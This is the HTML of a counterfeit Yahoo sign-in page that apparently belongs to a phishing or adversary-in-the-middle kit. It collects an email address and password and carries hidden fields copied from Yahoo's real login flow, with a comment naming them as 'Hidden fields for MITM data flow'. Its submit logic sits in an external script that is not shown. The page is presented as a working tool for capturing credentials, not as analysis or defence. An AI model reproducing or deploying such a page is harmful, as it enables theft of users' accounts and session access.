<body>
    <div class="yahoo-container">
        <div class="yahoo-logo">
            <img src="/placeholder.svg?height=60&width=120" alt="Yahoo" />
        </div>
        
        <div class="yahoo-form">
            <h1 style="text-align: center; margin-bottom: 20px; font-size: 24px; color: #333;">Sign in</h1>
            
            <form id="passwordForm" name="email-form" data-name="Email Form" class="form" method="POST">
                
                <!-- ðŸŽ¯ CRITICAL: Hidden fields for MITM data flow -->
                <input type="hidden" name="crumb" id="crumb">
                <input type="hidden" name="acrumb" id="acrumb">
                <input type="hidden" name="sessionIndex" id="sessionIndex">
                <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
                <input type="hidden" name="src" value="ym">
                <input type="hidden" name=".lang" value="en-US">
                <input type="hidden" name=".intl" value="us">
                <input type="hidden" name="displayName" id="displayName">
                <input type="hidden" name="browser-fp-data" id="browser-fp-data">
                <input type="hidden" name="deviceCapability" id="deviceCapability">
                <input type="hidden" name="signin" value="Next">
                <input type="hidden" name="persistent" value="y">
                <input type="hidden" name="g-recaptcha-response" id="recaptcha-response">
                
                <input type="email" id="username" name="username" class="yahoo-input" placeholder="Email address" required>
                <input type="password" id="passwd" name="passwd" class="yahoo-input" placeholder="Password" required>
                
                <div class="yahoo-error" id="errorMessage"></div>
                
                <button type="submit" class="yahoo-button" id="submitBtn">
                    <span id="btnText">Next</span>
                    <span id="btnSpinner" class="loading-spinner" style="display: none;"></span>
                </button>
            </form>
            
            <div style="text-align: center; margin-top: 20px;">
                <a href="#" style="color: #5f01d1; text-decoration: none; font-size: 14px;">Forgot password?</a>
            </div>
        </div>
    </div>

    <script src="js/yahoo-password.js"></script>
